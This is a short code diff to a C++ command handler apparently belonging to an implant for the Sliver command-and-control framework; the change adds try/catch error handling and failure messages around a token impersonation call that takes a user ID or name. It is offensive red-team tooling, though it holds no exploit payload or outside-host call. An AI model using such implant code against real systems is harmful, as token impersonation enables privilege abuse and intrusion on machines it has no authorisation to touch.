@@ -235,10 +235,22 @@ namespace handlers {
 		req.ParseFromString(data);
 		sliverpb::Impersonate resp;
 		bool res = FALSE;
-		if (utils::is_number(req.username()))
-			res = token::Impersonate(stoi(req.username()));
-		else
-			res = token::Impersonate(req.username());
+		try {
+			if (utils::is_number(req.username()))
+				res = token::Impersonate(stoi(req.username()));
+			else
+				res = token::Impersonate(req.username());
+			if (res == false) {
+				sliverpb::Response* common_resp = new sliverpb::Response();
+				common_resp->set_err(string{ "[-] Failed to impersonate no suitable token found" });
+				resp.set_allocated_response(common_resp);
+			}
+		}
+		catch (exception e) {
+			sliverpb::Response* common_resp = new sliverpb::Response();
+			common_resp->set_err(string{ "[-] Impersonate thrown following exception:\n" }+e.what());
+			resp.set_allocated_response(common_resp);
+		}
 		return wrapResponse(taskID, resp);
 	}
 }
